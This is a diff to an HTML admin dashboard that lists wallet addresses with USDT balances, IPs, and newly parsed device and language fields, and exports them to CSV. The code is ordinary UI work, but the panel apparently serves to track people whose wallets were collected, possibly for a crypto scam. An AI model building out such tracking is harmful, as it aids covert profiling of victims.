@@ -20,15 +20,18 @@
   .toolbar{display:flex;gap:10px;align-items:center;margin-bottom:16px;flex-wrap:wrap;}
   .toolbar button{padding:8px 16px;border-radius:8px;border:1px solid rgba(0,240,255,.3);background:transparent;color:#00F0FF;cursor:pointer;font-size:13px;transition:background .2s;}
   .toolbar button:hover{background:rgba(0,240,255,.1);}
-  .toolbar .count{color:rgba(200,210,230,.6);font-size:13px;margin-left:auto;}
+  .toolbar .spacer{flex:1;}
+  .toolbar .count{color:rgba(200,210,230,.6);font-size:13px;}
   .rec{background:#141826;border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:12px 16px;margin-bottom:8px;font-size:13px;}
   .rec .addr{color:#7AF7FF;font-family:ui-monospace,Menlo,Consolas,monospace;word-break:break-all;font-weight:600;margin-bottom:6px;font-size:12px;}
-  .rec .meta{color:rgba(200,210,230,.6);font-size:11px;display:flex;gap:16px;flex-wrap:wrap;}
+  .rec .meta{color:rgba(200,210,230,.6);font-size:11px;display:flex;gap:16px;flex-wrap:wrap;align-items:center;}
   .rec .meta span{display:inline-flex;align-items:center;gap:4px;}
+  .rec .meta .badge{padding:2px 8px;border-radius:6px;background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.2);color:#7AF7FF;}
+  .rec .meta .badge-device{background:rgba(176,38,255,.1);border-color:rgba(176,38,255,.3);color:#c084fc;}
+  .rec .meta .badge-lang{background:rgba(255,209,102,.08);border-color:rgba(255,209,102,.3);color:#FFD700;}
   .empty{color:rgba(200,210,230,.5);text-align:center;padding:60px 0;font-size:14px;}
   .copy-btn{margin-left:auto;padding:2px 8px;font-size:10px;border-radius:6px;border:1px solid rgba(0,240,255,.3);background:transparent;color:#00F0FF;cursor:pointer;}
   .copy-btn:hover{background:rgba(0,240,255,.1);}
-  /* 修改密码模态框 */
   .modal{position:fixed;inset:0;background:rgba(4,6,12,.75);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:50;padding:20px;}
   .modal.open{display:flex;}
   .modal-card{width:min(380px,100%);background:linear-gradient(180deg,#1a1d2c,#10121a);border-radius:16px;padding:28px 24px;box-shadow:0 0 0 1px rgba(0,240,255,.3),0 24px 48px rgba(0,0,0,.6);}
@@ -64,7 +67,6 @@
     <div id="listBox"></div>
   </div>
 
-  <!-- 修改密码弹窗 -->
   <div class="modal" id="pwdModal">
     <div class="modal-card">
       <h3>🔑 修改管理员密码</h3>
@@ -113,6 +115,26 @@
   function escapeHtml(s){
     if(!s) return '';
     return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  }
+
+  // 解析 User-Agent 成简写设备名
+  function parseDevice(ua){
+    if(!ua) return '—';
+    const s = ua.toLowerCase();
+    let os = '';
+    if(/iphone/.test(s)) os = 'iPhone';
+    else if(/ipad/.test(s)) os = 'iPad';
+    else if(/android/.test(s)) os = 'Android';
+    else if(/windows/.test(s)) os = 'Windows';
+    else if(/mac os/.test(s)) os = 'Mac';
+    else if(/linux/.test(s)) os = 'Linux';
+    let browser = '';
+    if(/edg\//.test(s)) browser = 'Edge';
+    else if(/chrome\//.test(s) && !/edg\//.test(s)) browser = 'Chrome';
+    else if(/safari/.test(s) && !/chrome/.test(s)) browser = 'Safari';
+    else if(/firefox/.test(s)) browser = 'Firefox';
+    else if(/opera|opr\//.test(s)) browser = 'Opera';
+    return [os, browser].filter(Boolean).join(' · ') || '—';
   }
 
   async function doLogin(){
@@ -169,7 +191,10 @@
       listBox.innerHTML = '<div class="empty">暂无记录</div>';
       return;
     }
-    listBox.innerHTML = records.map((r, i) => `
+    listBox.innerHTML = records.map((r, i) => {
+      const device = parseDevice(r.userAgent);
+      const lang = r.language || '—';
+      return `
       <div class="rec">
         <div class="addr" style="display:flex;align-items:center;gap:8px;">
           <span>${escapeHtml(r.address)}</span>
@@ -179,10 +204,12 @@
           <span>#${i+1}</span>
           <span>🕐 ${escapeHtml(r.time_local || r.time || '未知时间')}</span>
           <span>💰 ${escapeHtml(String(r.balance || '0.00'))} USDT</span>
-          ${r.ip ? `<span>🌐 ${escapeHtml(r.ip)}</span>` : ''}
+          ${r.ip ? `<span class="badge">🌐 ${escapeHtml(r.ip)}</span>` : ''}
+          <span class="badge badge-device">📱 ${escapeHtml(device)}</span>
+          <span class="badge badge-lang">🗣 ${escapeHtml(lang)}</span>
         </div>
-      </div>
-    `).join('');
+      </div>`;
+    }).join('');
 
     listBox.querySelectorAll('.copy-btn').forEach(btn => {
       btn.addEventListener('click', () => {
@@ -201,12 +228,14 @@
 
   function exportCSV(){
     if(!cacheRecords.length){ alert('暂无数据可导出'); return; }
-    const header = ['地址', '余额', '时间', 'IP'];
+    const header = ['地址', '余额', '时间', 'IP', '设备', '设备语言'];
     const rows = cacheRecords.map(r => [
       r.address,
       r.balance || '0.00',
       r.time_local || r.time || '',
-      r.ip || ''
+      r.ip || '',
+      parseDevice(r.userAgent),
+      r.language || ''
     ]);
     const csv = [header, ...rows]
       .map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
@@ -236,7 +265,6 @@
     listBox.innerHTML = '';
   }
 
-  // ===== 修改密码 =====
   function openPwdModal(){
     oldPwd.value = '';
     newPwd.value = '';
